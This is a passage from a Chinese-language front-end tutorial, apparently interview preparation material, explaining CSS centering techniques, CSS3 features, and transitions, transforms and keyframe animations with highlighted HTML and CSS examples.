        <span class="token property">height</span><span class="token punctuation">:</span> 200px<span class="token punctuation">;</span>
        <span class="token property">background</span><span class="token punctuation">:</span> skyblue<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token selector">.son</span> <span class="token punctuation">{</span>
        <span class="token property">width</span><span class="token punctuation">:</span> 100px<span class="token punctuation">;</span>
        <span class="token property">height</span><span class="token punctuation">:</span> 100px<span class="token punctuation">;</span>
        <span class="token property">background</span><span class="token punctuation">:</span> red<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>father<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>son<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>
</code></pre></div><ol start="5"><li><strong>grid网格布局</strong></li></ol> <div class="language-html extra-class"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">&gt;</span></span><span class="token style"><span class="token language-css">
<span class="token selector">.father</span> <span class="token punctuation">{</span>
  <span class="token property">display</span><span class="token punctuation">:</span> grid<span class="token punctuation">;</span>
  <span class="token property">align-items</span><span class="token punctuation">:</span>center<span class="token punctuation">;</span>
  <span class="token property">justify-content</span><span class="token punctuation">:</span> center<span class="token punctuation">;</span>
  <span class="token property">width</span><span class="token punctuation">:</span> 200px<span class="token punctuation">;</span>
  <span class="token property">height</span><span class="token punctuation">:</span> 200px<span class="token punctuation">;</span>
  <span class="token property">background</span><span class="token punctuation">:</span> skyblue<span class="token punctuation">;</span>

<span class="token punctuation">}</span>
<span class="token selector">.son</span> <span class="token punctuation">{</span>
  <span class="token property">width</span><span class="token punctuation">:</span> 10px<span class="token punctuation">;</span>
  <span class="token property">height</span><span class="token punctuation">:</span> 10px<span class="token punctuation">;</span>
  <span class="token property">border</span><span class="token punctuation">:</span> 1px solid red
<span class="token punctuation">}</span>
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>father<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>son<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>
</code></pre></div><ol start="6"><li><strong>table布局</strong></li></ol> <p>设置父元素为<code>display:table-cell</code>，子元素设置 <code>display: inline-block</code>。利用<code>vertical</code>和<code>text-align</code>可以让所有的行内块级元素水平垂直居中</p> <div class="language-html extra-class"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">&gt;</span></span><span class="token style"><span class="token language-css">
    <span class="token selector">.father</span> <span class="token punctuation">{</span>
        <span class="token property">display</span><span class="token punctuation">:</span> table-cell<span class="token punctuation">;</span>
        <span class="token property">width</span><span class="token punctuation">:</span> 200px<span class="token punctuation">;</span>
        <span class="token property">height</span><span class="token punctuation">:</span> 200px<span class="token punctuation">;</span>
        <span class="token property">background</span><span class="token punctuation">:</span> skyblue<span class="token punctuation">;</span>
        <span class="token property">vertical-align</span><span class="token punctuation">:</span> middle<span class="token punctuation">;</span>
        <span class="token property">text-align</span><span class="token punctuation">:</span> center<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token selector">.son</span> <span class="token punctuation">{</span>
        <span class="token property">display</span><span class="token punctuation">:</span> inline-block<span class="token punctuation">;</span>
        <span class="token property">width</span><span class="token punctuation">:</span> 100px<span class="token punctuation">;</span>
        <span class="token property">height</span><span class="token punctuation">:</span> 100px<span class="token punctuation">;</span>
        <span class="token property">background</span><span class="token punctuation">:</span> red<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>father<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>son<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>
</code></pre></div><p><strong>小结</strong></p> <p>不知道元素宽高大小仍能实现水平垂直居中的方法有：</p> <ul><li><code>利用定位+margin:auto</code></li> <li><code>利用定位+transform</code></li> <li><code>flex</code>布局</li> <li><code>grid</code>布局</li></ul> <p><strong>根据元素标签的性质，可以分为：</strong></p> <ul><li>内联元素居中布局</li> <li>块级元素居中布局</li></ul> <p><strong>内联元素居中布局</strong></p> <ul><li>水平居中
<ul><li>行内元素可设置：<code>text-align: center</code></li> <li><code>flex</code>布局设置父元素：<code>display: flex; justify-content: center</code></li></ul></li> <li>垂直居中
<ul><li>单行文本父元素确认高度：<code>height === line-height</code></li> <li>多行文本父元素确认高度：<code>display: table-cell; vertical-align: middle</code></li></ul></li></ul> <p><strong>块级元素居中布局</strong></p> <ul><li>水平居中
<ul><li>定宽: <code>margin: 0 auto</code></li> <li><code>绝对定位+left:50%+margin:负自身一半</code></li></ul></li> <li>垂直居中
<ul><li><code>position: absolute</code>设置<code>left</code>、<code>top</code>、<code>margin-left</code>、<code>margin-top</code>(定高)</li> <li><code>display: table-cell</code></li> <li><code>transform: translate(x, y)</code></li> <li><code>flex</code>(不定高，不定宽)</li> <li><code>grid</code>(不定高，不定宽)，兼容性相对比较差</li></ul></li></ul> <h3 id="css3的新特性"><a href="#css3的新特性" class="header-anchor">#</a> CSS3的新特性</h3> <p><img alt="" data-src="https://s.poetries.work/uploads/2022/09/29fc55febf95ee90.png" loading="lazy" class="lazy"></p> <p><strong>1. 是什么</strong></p> <p>css，即层叠样式表（Cascading Style Sheets）的简称，是一种标记语言，由浏览器解释执行用来使页面变得更美观</p> <p><code>css3</code>是css的最新标准，是向后兼容的，<code>CSS1/2</code>的特性在 <code>CSS3</code> 里都是可以使用的</p> <p>而 <code>CSS3</code> 也增加了很多新特性，为开发带来了更佳的开发体验</p> <p><strong>2. 选择器</strong></p> <p><code>css3</code>中新增了一些选择器，主要为如下图所示：</p> <p><img alt="" data-src="https://s.poetries.work/uploads/2022/09/bfd8984363dc561d.png" loading="lazy" class="lazy"></p> <p><strong>3. 新样式</strong></p> <ul><li><strong>边框</strong> <code>css3</code>新增了三个边框属性，分别是：
<ul><li><code>border-radius</code>：创建圆角边框</li> <li><code>box-shadow</code>：为元素添加阴影</li> <li><code>border-image</code>：使用图片来绘制边框</li></ul></li> <li><strong>box-shadow</strong> 设置元素阴影，设置属性如下（其中水平阴影和垂直阴影是必须设置的）
<ul><li>水平阴影</li> <li>垂直阴影</li> <li>模糊距离(虚实)</li> <li>阴影尺寸(影子大小)</li> <li>阴影颜色</li> <li>内/外阴影</li></ul></li> <li><strong>背景</strong> 新增了几个关于背景的属性，分别是<code>background-clip</code>、<code>background-origin</code>、<code>background-size</code>和<code>background-break</code> <ul><li><strong><code>background-clip</code></strong> 用于确定背景画区，有以下几种可能的属性：通常情况，背景都是覆盖整个元素的，利用这个属性可以设定背景颜色或图片的覆盖范围
<ul><li><code>background-clip: border-box</code>; 背景从<code>border</code>开始显示</li> <li><code>background-clip: padding-box</code>; 背景从<code>padding</code>开始显示</li> <li><code>background-clip: content-box</code>; 背景显<code>content</code>区域开始显示</li> <li><code>background-clip: no-clip</code>; 默认属性，等同于b<code>order-box</code></li></ul></li> <li><strong><code>background-origin</code></strong> 当我们设置背景图片时，图片是会以左上角对齐，但是是以<code>border</code>的左上角对齐还是以<code>padding</code>的左上角或者<code>content</code>的左上角对齐? <code>border-origin</code>正是用来设置这个的
<ul><li><code>background-origin: border-box</code>; 从<code>border</code>开始计算<code>background-position</code></li> <li><code>background-origin: padding-box</code>; 从<code>padding</code>开始计算<code>background-position</code></li> <li><code>background-origin: content-box</code>; 从<code>content</code>开始计算<code>background-position</code></li> <li>默认情况是<code>padding-box</code>，即以<code>padding</code>的左上角为原点</li></ul></li> <li><strong><code>background-size</code></strong> 常用来调整背景图片的大小，主要用于设定图片本身。有以下可能的属性：
<ul><li><code>background-size: contain</code>; 缩小图片以适合元素（维持像素长宽比）</li> <li><code>background-size: cover</code>; 扩展元素以填补元素（维持像素长宽比）</li> <li><code>background-size: 100px 100px</code>; 缩小图片至指定的大小</li> <li><code>background-size: 50% 100%</code>; 缩小图片至指定的大小，百分比是相对包 含元素的尺寸</li></ul></li> <li><strong><code>background-break</code></strong> 元素可以被分成几个独立的盒子（如使内联元素<code>span</code>跨越多行），<code>background-break</code> 属性用来控制背景怎样在这些不同的盒子中显示
<ul><li><code>background-break: continuous</code>; 默认值。忽略盒之间的距离（也就是像元素没有分成多个盒子，依然是一个整体一样）</li> <li><code>background-break: bounding-box</code>; 把盒之间的距离计算在内；</li> <li><code>background-break: each-box</code>; 为每个盒子单独重绘背景</li></ul></li></ul></li> <li><strong>文字</strong> <ul><li><strong><code>word-wrap: normal|break-word</code></strong> <ul><li><code>normal</code>：使用浏览器默认的换行</li> <li><code>break-all</code>：允许在单词内换行</li></ul></li> <li><strong><code>text-overflow</code></strong> 设置或检索当当前行超过指定容器的边界时如何显示，属性有两个值选择
<ul><li><code>clip</code>：修剪文本</li> <li><code>ellipsis</code>：显示省略符号来代表被修剪的文本</li></ul></li> <li><strong><code>text-shadow</code></strong> 可向文本应用阴影。能够规定水平阴影、垂直阴影、模糊距离，以及阴影的颜色</li> <li><strong><code>text-decoration</code></strong> CSS3里面开始支持对文字的更深层次的渲染，具体有三个属性可供设置：
<ul><li><code>text-fill-color</code>: 设置文字内部填充颜色</li> <li><code>text-stroke-color</code>: 设置文字边界填充颜色</li> <li><code>text-stroke-width</code>: 设置文字边界宽度</li></ul></li></ul></li> <li><strong>颜色</strong> <ul><li><code>css3</code>新增了新的颜色表示方式<code>rgba</code>与<code>hsla</code></li> <li><code>rgba</code>分为两部分，<code>rgb</code>为颜色值，<code>a</code>为透明度</li> <li><code>hala</code>分为四部分，<code>h</code>为色相，<code>s</code>为饱和度，<code>l</code>为亮度，<code>a</code>为透明度</li></ul></li></ul> <p><strong>4. transition 过渡</strong></p> <p><code>transition</code>属性可以被指定为一个或多个CSS属性的过渡效果，多个属性之间用逗号进行分隔，必须规定两项内容：</p> <ul><li>过度效果</li> <li>持续时间</li></ul> <div class="language- extra-class"><pre class="language-text"><code>transition： CSS属性，花费时间，效果曲线(默认ease)，延迟时间(默认0)
</code></pre></div><p>上面为简写模式，也可以分开写各个属性</p> <div class="language-css extra-class"><pre class="language-css"><code><span class="token property">transition-property</span><span class="token punctuation">:</span> width<span class="token punctuation">;</span> 
<span class="token property">transition-duration</span><span class="token punctuation">:</span> 1s<span class="token punctuation">;</span>
<span class="token property">transition-timing-function</span><span class="token punctuation">:</span> linear<span class="token punctuation">;</span>
<span class="token property">transition-delay</span><span class="token punctuation">:</span> 2s<span class="token punctuation">;</span>
</code></pre></div><p><strong>5. transform 转换</strong></p> <ul><li><code>transform</code>属性允许你旋转，缩放，倾斜或平移给定元素</li> <li><code>transform-origin</code>：转换元素的位置（围绕那个点进行转换），默认值为<code>(x,y,z):(50%,50%,0)</code></li></ul> <p>使用方式：</p> <ul><li><code>transform: translate(120px, 50%)</code>：位移</li> <li><code>transform: scale(2, 0.5)</code>：缩放</li> <li><code>transform: rotate(0.5turn)</code>：旋转</li> <li><code>transform: skew(30deg, 20deg)</code>：倾斜</li></ul> <p><strong>6. animation 动画</strong></p> <p>动画这个平常用的也很多，主要是做一个预设的动画。和一些页面交互的动画效果，结果和过渡应该一样，让页面不会那么生硬</p> <p><code>animation</code>也有很多的属性</p> <ul><li><code>animation-name</code>：动画名称</li> <li><code>animation-duration</code>：动画持续时间</li> <li><code>animation-timing-function</code>：动画时间函数</li> <li><code>animation-delay</code>：动画延迟时间</li> <li><code>animation-iteration-count</code>：动画执行次数，可以设置为一个整数，也可以设置为infinite，意思是无限循环</li> <li><code>animation-direction</code>：动画执行方向</li> <li><code>animation-paly-state</code>：动画播放状态</li> <li><code>animation-fill-mode</code>：动画填充模式</li></ul> <p><strong>7. 渐变</strong></p> <p>颜色渐变是指在两个颜色之间平稳的过渡，<code>css3</code>渐变包括</p> <ul><li><code>linear-gradient</code>：线性渐变 <code>background-image: linear-gradient(direction, color-stop1, color-stop2, ...)</code>;</li> <li><code>radial-gradient</code>：径向渐变 <code>linear-gradient(0deg, red, green)</code></li></ul> <p><strong>8. 其他</strong></p> <ul><li><code>Flex</code>弹性布局</li> <li><code>Grid</code>栅格布局</li> <li>媒体查询 <code>@media screen and (max-width: 960px) {}</code>还有打印<code>print</code></li></ul> <p><strong>transition和animation的区别</strong></p> <blockquote><p><code>Animation</code>和<code>transition</code>大部分属性是相同的，他们都是随时间改变元素的属性值，他们的主要区别是<code>transition</code>需要触发一个事件才能改变属性，而<code>animation</code>不需要触发任何事件的情况下才会随时间改变属性值，并且<code>transition</code>为2帧，从<code>from .... to</code>，而<code>animation</code>可以一帧一帧的</p></blockquote> <h3 id="css动画和过渡"><a href="#css动画和过渡" class="header-anchor">#</a> CSS动画和过渡</h3> <p>常见的动画效果有很多，如<code>平移</code>、<code>旋转</code>、<code>缩放</code>等等，复杂动画则是多个简单动画的组合</p> <p><strong>css实现动画的方式，有如下几种：</strong></p> <ul><li><code>transition</code> 实现渐变动画</li> <li><code>transform</code> 转变动画</li> <li><code>animation</code> 实现自定义动画</li></ul> <p><strong>1. transition 实现渐变动画</strong></p> <p><strong>transition的属性如下：</strong></p> <ul><li><code>transition-property:填写需要变化的css属性</code></li> <li><code>transition-duration:完成过渡效果需要的时间单位(s或者ms)默认是 0</code></li> <li><code>transition-timing-function:完成效果的速度曲线</code></li> <li><code>transition-delay: （规定过渡效果何时开始。默认是</code>0<code>）</code></li></ul> <blockquote><p>一般情况下，我们都是写一起的，比如：<code>transition： width 2s ease 1s</code></p></blockquote> <p>其中<code>timing-function</code>的值有如下：</p> <table><thead><tr><th>值</th> <th>描述</th></tr></thead> <tbody><tr><td><code>linear</code></td> <td>匀速（等于 <code>cubic-bezier(0,0,1,1)</code>）</td></tr> <tr><td><code>ease</code></td> <td>从慢到快再到慢（<code>cubic-bezier(0.25,0.1,0.25,1)</code>）</td></tr> <tr><td><code>ease-in</code></td> <td>慢慢变快（等于 <code>cubic-bezier(0.42,0,1,1)</code>）</td></tr> <tr><td><code>ease-out</code></td> <td>慢慢变慢（等于 <code>cubic-bezier(0,0,0.58,1)</code>）</td></tr> <tr><td><code>ease-in-out</code></td> <td>先变快再到慢（等于 cubic-bezier(0.42,0,0.58,1)`），渐显渐隐效果</td></tr> <tr><td><code>cubic-bezier(*n*,*n*,*n*,*n*)</code></td> <td>在 <code>cubic-bezier</code> 函数中定义自己的值。可能的值是 <code>0</code> 至 <code>1</code> 之间的数值</td></tr></tbody></table> <p>注意：并不是所有的属性都能使用过渡的，如<code>display:none&lt;-&gt;display:block</code></p> <p>举个例子，实现鼠标移动上去发生变化动画效果</p> <div class="language-html extra-class"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">&gt;</span></span><span class="token style"><span class="token language-css">
  <span class="token selector">.base</span> <span class="token punctuation">{</span>
    <span class="token property">width</span><span class="token punctuation">:</span> 100px<span class="token punctuation">;</span>
    <span class="token property">height</span><span class="token punctuation">:</span> 100px<span class="token punctuation">;</span>
    <span class="token property">display</span><span class="token punctuation">:</span> inline-block<span class="token punctuation">;</span>
    <span class="token property">background-color</span><span class="token punctuation">:</span> #0EA9FF<span class="token punctuation">;</span>
    <span class="token property">border-width</span><span class="token punctuation">:</span> 5px<span class="token punctuation">;</span>
    <span class="token property">border-style</span><span class="token punctuation">:</span> solid<span class="token punctuation">;</span>
    <span class="token property">border-color</span><span class="token punctuation">:</span> #5daf34<span class="token punctuation">;</span>
    <span class="token property">transition-property</span><span class="token punctuation">:</span> width<span class="token punctuation">,</span> height<span class="token punctuation">,</span> background-color<span class="token punctuation">,</span> border-width<span class="token punctuation">;</span>
    <span class="token property">transition-duration</span><span class="token punctuation">:</span> 2s<span class="token punctuation">;</span>
    <span class="token property">transition-timing-function</span><span class="token punctuation">:</span> ease-in<span class="token punctuation">;</span>
    <span class="token property">transition-delay</span><span class="token punctuation">:</span> 500ms<span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  <span class="token comment">/*简写*/</span>
  <span class="token comment">/*transition: all 2s ease-in 500ms;*/</span>
  <span class="token selector">.base:hover</span> <span class="token punctuation">{</span>
    <span class="token property">width</span><span class="token punctuation">:</span> 200px<span class="token punctuation">;</span>
    <span class="token property">height</span><span class="token punctuation">:</span> 200px<span class="token punctuation">;</span>
    <span class="token property">background-color</span><span class="token punctuation">:</span> #5daf34<span class="token punctuation">;</span>
    <span class="token property">border-width</span><span class="token punctuation">:</span> 10px<span class="token punctuation">;</span>
    <span class="token property">border-color</span><span class="token punctuation">:</span> #3a8ee6<span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>base<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>
</code></pre></div><p><strong>2. transform 转变动画</strong></p> <p>包含四个常用的功能：</p> <ul><li><code>translate(x,y)</code>：位移</li> <li><code>scale</code>：缩放</li> <li><code>rotate</code>：旋转</li> <li><code>skew</code>：倾斜</li></ul> <p>一般配合<code>transition</code>过度使用</p> <blockquote><p>注意的是，<code>transform</code>不支持<code>inline元</code>素，使用前把它变成<code>block</code></p></blockquote> <p>举个例子</p> <div class="language-html extra-class"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">&gt;</span></span><span class="token style"><span class="token language-css">
<span class="token selector">.base</span> <span class="token punctuation">{</span>
  <span class="token property">width</span><span class="token punctuation">:</span> 100px<span class="token punctuation">;</span>
  <span class="token property">height</span><span class="token punctuation">:</span> 100px<span class="token punctuation">;</span>
  <span class="token property">display</span><span class="token punctuation">:</span> inline-block<span class="token punctuation">;</span>
  <span class="token property">background-color</span><span class="token punctuation">:</span> #0EA9FF<span class="token punctuation">;</span>
  <span class="token property">border-width</span><span class="token punctuation">:</span> 5px<span class="token punctuation">;</span>
  <span class="token property">border-style</span><span class="token punctuation">:</span> solid<span class="token punctuation">;</span>
  <span class="token property">border-color</span><span class="token punctuation">:</span> #5daf34<span class="token punctuation">;</span>
  <span class="token property">transition-property</span><span class="token punctuation">:</span> width<span class="token punctuation">,</span> height<span class="token punctuation">,</span> background-color<span class="token punctuation">,</span> border-width<span class="token punctuation">;</span>
  <span class="token property">transition-duration</span><span class="token punctuation">:</span> 2s<span class="token punctuation">;</span>
  <span class="token property">transition-timing-function</span><span class="token punctuation">:</span> ease-in<span class="token punctuation">;</span>
  <span class="token property">transition-delay</span><span class="token punctuation">:</span> 500ms<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token selector">.base2</span> <span class="token punctuation">{</span>
  <span class="token property">transform</span><span class="token punctuation">:</span> none<span class="token punctuation">;</span>
  <span class="token property">transition-property</span><span class="token punctuation">:</span> transform<span class="token punctuation">;</span>
  <span class="token property">transition-delay</span><span class="token punctuation">:</span> 5ms<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token selector">.base2:hover</span> <span class="token punctuation">{</span>
  <span class="token property">transform</span><span class="token punctuation">:</span> <span class="token function">scale</span><span class="token punctuation">(</span>0.8<span class="token punctuation">,</span> 1.5<span class="token punctuation">)</span> <span class="token function">rotate</span><span class="token punctuation">(</span>35deg<span class="token punctuation">)</span> <span class="token function">skew</span><span class="token punctuation">(</span>5deg<span class="token punctuation">)</span> <span class="token function">translate</span><span class="token punctuation">(</span>15px<span class="token punctuation">,</span> 25px<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>base base2<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>
</code></pre></div><p>可以看到盒子发生了旋转，倾斜，平移，放大</p> <p><strong>3. animation 实现自定义动画</strong></p> <blockquote><p>一个关键帧动画，最少包含两部分，<code>animation</code> 属性及属性值（动画的名称和运行方式运行时间等）<code>@keyframes</code>（规定动画的具体实现过程）</p></blockquote> <p><code>animation</code>是由 <code>8</code> 个属性的简写，分别如下：</p> <table><thead><tr><th>属性</th> <th>描述</th> <th>属性值</th></tr></thead> <tbody><tr><td><code>animation-duration</code></td> <td>指定动画完成一个周期所需要时间，单位秒（<code>s</code>）或毫秒（<code>ms</code>），默认是 <code>0</code></td> <td></td></tr> <tr><td><code>animation-timing-function</code></td> <td>指定动画计时函数，即动画的速度曲线，默认是 &quot;<code>ease</code>&quot;</td> <td><code>linear</code>、<code>ease</code>、<code>ease-in</code>、<code>ease-out</code>、<code>ease-in-out</code></td></tr> <tr><td><code>animation-delay</code></td> <td>指定动画延迟时间，即动画何时开始，默认是 <code>0</code></td> <td></td></tr> <tr><td><code>animation-iteration-count</code></td> <td>指定动画播放的次数，默认是 <code>1</code>。但我们一般用<code>infinite</code>，一直播放</td> <td></td></tr> <tr><td><code>animation-direction</code> 指定动画播放的方向</td> <td>默认是 <code>normal</code></td> <td><code>normal</code>、<code>reverse</code>、<code>alternate</code>、<code>alternate-reverse</code></td></tr> <tr><td><code>animation-fill-mode</code></td> <td>指定动画填充模式。默认是 <code>none</code></td> <td><code>forwards</code>、<code>backwards</code>、<code>both</code></td></tr> <tr><td><code>animation-play-state</code></td> <td>指定动画播放状态，正在运行或暂停。默认是 <code>running</code></td> <td><code>running</code>、<code>pauser</code></td></tr> <tr><td><code>animation-name</code></td> <td>指定 <code>@keyframes</code> 动画的名称</td> <td></td></tr></tbody></table> <p><code>CSS</code> 动画只需要定义一些关键的帧，而其余的帧，浏览器会根据计时函数插值计算出来，</p> <blockquote><p><code>@keyframes</code>定义关键帧，可以是<code>from-&gt;to</code>（等同于<code>0%</code>和<code>100%</code>），也可以是从<code>0%-&gt;100%</code>之间任意个的分层设置</p></blockquote> <p>因此，如果我们想要让元素旋转一圈，只需要定义开始和结束两帧即可：</p> <div class="language-css extra-class"><pre class="language-css"><code><span class="token atrule"><span class="token rule">@keyframes</span> rotate</span><span class="token punctuation">{</span>
  <span class="token selector">from</span> <span class="token punctuation">{</span>
    <span class="token property">transform</span><span class="token punctuation">:</span> <span class="token function">rotate</span><span class="token punctuation">(</span>0deg<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token selector">to</span> <span class="token punctuation">{</span>
    <span class="token property">transform</span><span class="token punctuation">:</span> <span class="token function">rotate</span><span class="token punctuation">(</span>360deg<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre></div><blockquote><p><code>from</code> 表示最开始的那一帧，<code>to</code> 表示结束时的那一帧</p></blockquote> <p><strong>也可以使用百分比刻画生命周期</strong></p> <div class="language-css extra-class"><pre class="language-css"><code><span class="token atrule"><span class="token rule">@keyframes</span> rotate</span><span class="token punctuation">{</span>
  <span class="token selector">0%</span><span class="token punctuation">{</span>
    <span class="token property">transform</span><span class="token punctuation">:</span> <span class="token function">rotate</span><span class="token punctuation">(</span>0deg<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token selector">50%</span><span class="token punctuation">{</span>
    <span class="token property">transform</span><span class="token punctuation">:</span> <span class="token function">rotate</span><span class="token punctuation">(</span>180deg<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token selector">100%</span><span class="token punctuation">{</span>
    <span class="token property">transform</span><span class="token punctuation">:</span> <span class="token function">rotate</span><span class="token punctuation">(</span>360deg<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre></div><p>定义好了关键帧后，下来就可以直接用它了：</p> <div class="language-css extra-class"><pre class="language-css"><code><span class="token property">animation</span><span class="token punctuation">:</span> rotate 2s<span class="token punctuation">;</span>
</code></pre></div><p><strong>总结</strong></p> <table><thead><tr><th>属性</th> <th>含义</th></tr></thead> <tbody><tr><td><code>transition（过度）</code></td> <td>用于设置元素的样式过度，和<code>animation</code>有着类似的效果，但细节上有很大的不同</td></tr> <tr><td><code>transform（变形）</code></td> <td>用于元素进行旋转、缩放、移动或倾斜，和设置样式的动画并没有什么关系，就相当于<code>color</code>一样用来设置元素的“外表”</td></tr> <tr><td><code>translate（移动）</code></td> <td>只是<code>transform</code>的一个属性值，即移动</td></tr> <tr><td><code>animation（动画）</code></td> <td>用于设置动画属性，他是一个简写的属性，包含<code>6</code>个属性</td></tr></tbody></table> <p><strong>4. 用css3动画使一个图片旋转</strong></p> <div class="language-css extra-class"><pre class="language-css"><code><span class="token selector">#loader</span> <span class="token punctuation">{</span>
  <span class="token property">display</span><span class="token punctuation">:</span> block<span class="token punctuation">;</span>
  <span class="token property">position</span><span class="token punctuation">:</span> relative<span class="token punctuation">;</span>
  <span class="token property">-webkit-animation</span><span class="token punctuation">:</span> spin 2s linear infinite<span class="token punctuation">;</span>
  <span class="token property">animation</span><span class="token punctuation">:</span> spin 2s linear infinite<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token atrule"><span class="token rule">@-webkit-keyframes</span> spin</span> <span class="token punctuation">{</span>
  <span class="token selector">0%</span>   <span class="token punctuation">{</span>
    <span class="token property">-webkit-transform</span><span class="token punctuation">:</span> <span class="token function">rotate</span><span class="token punctuation">(</span>0deg<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token property">-ms-transform</span><span class="token punctuation">:</span> <span class="token function">rotate</span><span class="token punctuation">(</span>0deg<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token property">transform</span><span class="token punctuation">:</span> <span class="token function">rotate</span><span class="token punctuation">(</span>0deg<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token selector">100%</span> <span class="token punctuation">{</span>
    <span class="token property">-webkit-transform</span><span class="token punctuation">:</span> <span class="token function">rotate</span><span class="token punctuation">(</span>360deg<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token property">-ms-transform</span><span class="token punctuation">:</span> <span class="token function">rotate</span><span class="token punctuation">(</span>360deg<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token property">transform</span><span class="token punctuation">:</span> <span class="token function">rotate</span><span class="token punctuation">(</span>360deg<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token atrule"><span class="token rule">@keyframes</span> spin</span> <span class="token punctuation">{</span>
  <span class="token selector">0%</span>   <span class="token punctuation">{</span>
    <span class="token property">-webkit-transform</span><span class="token punctuation">:</span> <span class="token function">rotate</span><span class="token punctuation">(</span>0deg<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token property">-ms-transform</span><span class="token punctuation">:</span> <span class="token function">rotate</span><span class="token punctuation">(</span>0deg<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token property">transform</span><span class="token punctuation">:</span> <span class="token function">rotate</span><span class="token punctuation">(</span>0deg<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token selector">100%</span> <span class="token punctuation">{</span>
